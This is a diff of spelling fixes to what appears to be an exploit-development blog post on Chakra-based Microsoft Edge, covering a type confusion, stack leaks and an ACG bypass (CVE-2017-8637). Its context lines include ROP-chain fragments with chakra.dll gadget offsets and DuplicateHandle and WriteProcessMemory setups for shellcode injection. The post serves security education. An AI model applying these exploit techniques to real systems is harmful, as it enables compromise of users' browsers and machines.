@@ -597,7 +597,7 @@ Using the Project Zero issue as a guide, and leveraging the process outlined in 
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion24.png" alt="">
 
-The Google Project Zero [issue](https://bugs.chromium.org/p/project-zero/issues/detail?id=1360) explains that we essentially can just walk the `type` pointer to extract a `ScriptContext` structure which, in turn, contains `ThreadContext`. The `ThreadContext` structure is responsible, as we have see, for storing various stack addresses. Here are the offsets:
+The Google Project Zero [issue](https://bugs.chromium.org/p/project-zero/issues/detail?id=1360) explains that we essentially can just walk the `type` pointer to extract a `ScriptContext` structure which, in turn, contains `ThreadContext`. The `ThreadContext` structure is responsible, as we have seen, for storing various stack addresses. Here are the offsets:
 
 1. `type + 0x8` = `JavaScriptLibrary`
 2. `JavaScriptLibrary + 0x430` = `ScriptContext`
@@ -1146,7 +1146,7 @@ As we hinted at, and briefly touched on earlier in this blog post, we know that 
 
 As we have already seen in this blog post, two processes are generated (JIT server and content process) and the JIT server is responsible for taking the JavaScript code from the content process and transforming it into machine code. This machine code is then mapped back into the content process with appropriate permissions (like that of the `.text` section, RX). The vulnerability ([CVE-2017-8637](https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2017-8637)) mentioned in this section of the blog post took advantage of a flaw in this architecture to compromise Edge fully and, thus, bypass ACG. Let's talk about a bit about the architecture of the JIT server and content process communication channel first (please note that this vulnerability has been patched).
 
-The last thing to note, however, is where Matt says that the JIT process was moved "...into a separate process that runs in its own isolated sandbox". Notice how Matt did not say that it was moved into an ACG-compliant process (as we know, ACG isn't compatible with JIT). Although the JIT process may be "sandboxed" it does not have ACG enabled. It does, however, have CIG _and_ "no child processes" enabled. We will be taking advantage of the fact the JIT process doesn't (and still to this day doesn't, although the new V8 version of Edge only has ACG support in a special mode) have ACG enabled. With our ACG bypass, we will leverage a vulnerability with the way Chakra-based Edge managed communications (specifically via process a handle stored within the content process) to and from the JIT server. With that said, let's move on.
+The last thing to note, however, is where Matt says that the JIT process was moved "...into a separate process that runs in its own isolated sandbox". Notice how Matt did not say that it was moved into an ACG-compliant process (as we know, ACG isn't compatible with JIT). Although the JIT process may be "sandboxed" it does not have ACG enabled. It does, however, have CIG _and_ "no child processes" enabled. We will be taking advantage of the fact the JIT process doesn't (and still to this day doesn't, although the new V8 version of Edge only has ACG support in a special mode) have ACG enabled. With our ACG bypass, we will leverage a vulnerability with the way Chakra-based Edge managed communications (specifically via a process handle stored within the content process) to and from the JIT server. With that said, let's move on.
 
 Leaking The JIT Server Handle
 ---
@@ -1234,7 +1234,7 @@ The answer is pretty straightforward - if we look in the `GetCurrentProcess` [Re
 
 So, even though the pseudo handle only represents a handle to the current process and is only valid within the current process, the `DuplicateHandle` function has the ability to convert this pseudo  handle, which is only valid within the current process (in our case, the current process is the content process where the pseudo handle to be duplicated exists) into an _actual_ or _real_ handle which can be leveraged by other processes. This is exactly why the content process will duplicate its pseudo handle - it allows the content process to create an _actual_ handle to itself, with `PROCESS_ALL_ACCESS` permissions, which can be actively used by other processes (in our case, this duplicated handle can be used by the JIT server to map JIT'd code into the content process).
 
-So, in totality, its possible for the content process to call `GetCurrentProcess` (which returns a `PROCESS_ALL_ACCESS` handle to the content process) and then use `DuplicateHandle` to duplicate this handle for the JIT server to use. However, where things get interesting is the third parameter of `DuplicateHandle`, which is `hTargetProcessHandle`. This parameter has the following description:
+So, in totality, it's possible for the content process to call `GetCurrentProcess` (which returns a `PROCESS_ALL_ACCESS` handle to the content process) and then use `DuplicateHandle` to duplicate this handle for the JIT server to use. However, where things get interesting is the third parameter of `DuplicateHandle`, which is `hTargetProcessHandle`. This parameter has the following description:
 
 > A handle to the process that is to receive the duplicated handle. The handle must have the `PROCESS_DUP_HANDLE` access right...
 
@@ -2384,7 +2384,7 @@ Again, we are currently using a blank "parameter placeholder" in this case, as o
 1. Storing shellcode + `VirtualProtect` ROP chain with the `.data` section of `chakra.dll` (in the JIT process)
 2. These items will eventually be injected into the JIT process (where ACG is disabled).
 3. We will hijack control-flow execution in the JIT process to force it to execute our ROP chain. Our ROP chain will mark our shellcode as RWX and jump to it
-4. Lastly, our ROP chain is missing some information, as the shellcode hasn't been injected. This information will be reconcicled with our "long" ROP chains that we are about to embark on in the next few sections of this blog post. So, for now, the "final" `VirtualProtect` ROP chain has some missing information, which we will reconcile on the fly.
+4. Lastly, our ROP chain is missing some information, as the shellcode hasn't been injected. This information will be reconciled with our "long" ROP chains that we are about to embark on in the next few sections of this blog post. So, for now, the "final" `VirtualProtect` ROP chain has some missing information, which we will reconcile on the fly.
 
 Lastly, before moving on, let's see how our shellcode and ROP chain look like after we execute our exploit (as it currently is).
 
@@ -2402,7 +2402,7 @@ Let's now start working on our exploit in order to achieve execution of our fina
 
 `DuplicateHandle` ROP Chain
 ---
-Before we begin, each ROP gadget I write has an associated commetn. My blog will sometimes cut these off when I paste a code snippet, and you might be required to slide the bar under the code snippet to the right to see comments.
+Before we begin, each ROP gadget I write has an associated comment. My blog will sometimes cut these off when I paste a code snippet, and you might be required to slide the bar under the code snippet to the right to see comments.
 
 We have, as we have seen, already prepared what we are eventually going to execute within the JIT process. However, we still have to figure out _how_ we are going to inject these into the JIT process, and begin code execution. This journey to this goal begins with our overwritten return address, causing control-flow hijacking, to start our ROP chain (just like in part two of this blog series). However, instead of directly executing a ROP chain to call `WinExec`, we will be chaining together _multiple_ ROP chains in order to achieve this goal. Everything that happens in our exploit now happens in the content process (for the foreseeable future).
 
@@ -2465,7 +2465,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -2854,7 +2854,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -3212,7 +3212,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -3664,7 +3664,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -4223,7 +4223,7 @@ Here is how this call is setup:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
 	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
 	addressof(VirtualAllocEx_Allocation),			// Address of our VirtualAllocEx allocation (where our shellcode resides in the JIT process at this point in the exploit)
 	0x8							// 64-bit pointer size (sizeof(QWORD)))
@@ -4264,7 +4264,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -4711,7 +4711,7 @@ Our call is now in the current state:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
 	-
 	-
 	0x8							// 64-bit pointer size (sizeof(QWORD)))
@@ -4727,7 +4727,7 @@ Our call is now in the current state:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
 	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
 	-
 	0x8							// 64-bit pointer size (sizeof(QWORD)))
@@ -4743,7 +4743,7 @@ Our call is now in the following state:
 
 ```c
 WriteProcessMemory(
-	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Psuedo handle to the current process (the content process, when the exploit is executing)
+	(HANDLE)0xFFFFFFFFFFFFFFFF, 				// Pseudo handle to the current process (the content process, when the exploit is executing)
 	addressof(VirtualProtectROPChain_offset),		// Address of our return value from VirtualAllocEx (where we want to write the VirtualAllocEx_allocation address to)
 	addressof(VirtualAllocEx_Allocation),			// Address of our VirtualAllocEx allocation (where our shellcode resides in the JIT process at this point in the exploit)
 	0x8							// 64-bit pointer size (sizeof(QWORD)))
@@ -4813,7 +4813,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -5362,7 +5362,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -6052,7 +6052,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -6818,7 +6818,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -7559,7 +7559,7 @@ function next()
 // (HANDLE)-1 value of current process
 write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 next();
-write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 next();
 
 // HANDLE hTargetProcessHandle (R8)
@@ -8857,7 +8857,7 @@ function main() {
 	// (HANDLE)-1 value of current process
 	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
 	next();
-	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
 	next();
 
 	// HANDLE hTargetProcessHandle (R8)
